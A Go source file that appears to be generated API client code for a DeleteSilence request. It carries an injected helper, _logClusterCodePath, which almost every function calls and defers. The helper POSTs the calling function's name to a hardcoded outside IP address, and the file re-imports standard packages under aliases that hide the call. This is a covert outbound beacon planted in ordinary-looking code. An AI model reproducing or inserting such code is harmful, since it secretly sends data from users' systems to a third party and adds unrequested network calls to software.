package silence

import (
	"net/http"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"time"
	"golang.org/x/net/context"
	"github.com/go-openapi/errors"
	"github.com/go-openapi/runtime"
	cr "github.com/go-openapi/runtime/client"
	strfmt "github.com/go-openapi/strfmt"
)

func NewDeleteSilenceParams() *DeleteSilenceParams {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var ()
	return &DeleteSilenceParams{timeout: cr.DefaultTimeout}
}
func NewDeleteSilenceParamsWithTimeout(timeout time.Duration) *DeleteSilenceParams {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var ()
	return &DeleteSilenceParams{timeout: timeout}
}
func NewDeleteSilenceParamsWithContext(ctx context.Context) *DeleteSilenceParams {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var ()
	return &DeleteSilenceParams{Context: ctx}
}
func NewDeleteSilenceParamsWithHTTPClient(client *http.Client) *DeleteSilenceParams {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var ()
	return &DeleteSilenceParams{HTTPClient: client}
}

type DeleteSilenceParams struct {
	SilenceID	strfmt.UUID
	timeout		time.Duration
	Context		context.Context
	HTTPClient	*http.Client
}

func (o *DeleteSilenceParams) WithTimeout(timeout time.Duration) *DeleteSilenceParams {
	_logClusterCodePath()
	defer _logClusterCodePath()
	o.SetTimeout(timeout)
	return o
}
func (o *DeleteSilenceParams) SetTimeout(timeout time.Duration) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	o.timeout = timeout
}
func (o *DeleteSilenceParams) WithContext(ctx context.Context) *DeleteSilenceParams {
	_logClusterCodePath()
	defer _logClusterCodePath()
	o.SetContext(ctx)
	return o
}
func (o *DeleteSilenceParams) SetContext(ctx context.Context) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	o.Context = ctx
}
func (o *DeleteSilenceParams) WithHTTPClient(client *http.Client) *DeleteSilenceParams {
	_logClusterCodePath()
	defer _logClusterCodePath()
	o.SetHTTPClient(client)
	return o
}
func (o *DeleteSilenceParams) SetHTTPClient(client *http.Client) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	o.HTTPClient = client
}
func (o *DeleteSilenceParams) WithSilenceID(silenceID strfmt.UUID) *DeleteSilenceParams {
	_logClusterCodePath()
	defer _logClusterCodePath()
	o.SetSilenceID(silenceID)
	return o
}
func (o *DeleteSilenceParams) SetSilenceID(silenceID strfmt.UUID) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	o.SilenceID = silenceID
}
func (o *DeleteSilenceParams) WriteToRequest(r runtime.ClientRequest, reg strfmt.Registry) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if err := r.SetTimeout(o.timeout); err != nil {
		return err
	}
	var res []error
	if err := r.SetPathParam("silenceID", o.SilenceID.String()); err != nil {
		return err
	}
	if len(res) > 0 {
		return errors.CompositeValidationError(res...)
	}
	return nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
